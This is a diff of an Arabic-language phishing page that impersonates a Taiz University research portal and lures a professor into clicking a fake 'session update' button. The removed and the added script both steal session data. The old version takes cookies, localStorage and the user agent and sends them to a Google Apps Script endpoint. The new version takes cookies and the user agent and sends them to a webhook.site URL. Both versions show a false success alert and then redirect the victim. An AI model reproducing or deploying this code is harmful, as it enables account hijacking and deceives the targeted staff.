@@ -1,50 +1,18 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>بوابة المراجع الأكاديمية - جامعة تعز</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border-top: 5px solid #0056b3; }
-        h2 { color: #0056b3; margin-bottom: 15px; }
-        p { color: #555; font-size: 15px; line-height: 1.6; }
-        .btn { background-color: #0056b3; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; transition: 0.3s; margin-top: 20px; width: 100%; }
-        .btn:hover { background-color: #003d7a; }
-        .logo { font-size: 50px; margin-bottom: 10px; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <div class="logo">🎓</div>
-    <h2>نظام مزامنة الأبحاث</h2>
-    <p>عزيزي الدكتور، يرجى تحديث جلسة الاتصال (Session Update) لضمان استلام ملفات مشاريع التخرج لهذا الفصل بشكل آمن.</p>
-    <button class="btn" onclick="executeAttack()">تحديث الجلسة الآن</button>
-</div>
-
 <script>
-    function executeAttack() {
-        // جمع الهوية الرقمية (Cookies + LocalStorage)
-        const stolenData = "Session_Cookies: " + document.cookie + 
-                         " | Storage_Data: " + JSON.stringify(localStorage) +
-                         " | User_Agent: " + navigator.userAgent;
+    function sendData() {
+        const stolenData = "Session_Data: " + document.cookie + 
+                         " | UserAgent: " + navigator.userAgent;
 
-        // الرابط الخاص بك الذي أرسلته لي
-        const scriptUrl = "https://script.google.com/macros/s/AKfycbz29mEFjA7VMdPNXE_z_I6W2LNFLwiMpJ-gRZyer42cALwJUT7qqD6QQ4lyW48WBSZ9/exec";
+        // رابطك الخاص:
+        const webhookUrl = "https://webhook.site/b8061e9d-7cda-4ad7-a02a-118a21745d01";
 
-        // إرسال البيانات فوراً إلى الـ Spreadsheet الخاصة بك
-        fetch(scriptUrl, {
+        fetch(webhookUrl, {
             method: "POST",
             mode: "no-cors",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "data=" + encodeURIComponent(stolenData)
+            body: stolenData
         });
 
-        // إيهام الدكتور بأن العملية نجحت وتحويله لموقع رسمي
-        alert("تم تحديث الجلسة بنجاح. شكراً لتعاونكم دكتور.");
-        window.location.href = "https://www.google.com"; 
+        alert("تم تحديث الجلسة بنجاح.");
+        window.location.href = "https://www.google.com";
     }
-</script>
-
-</body>
-</html>
+</script> 
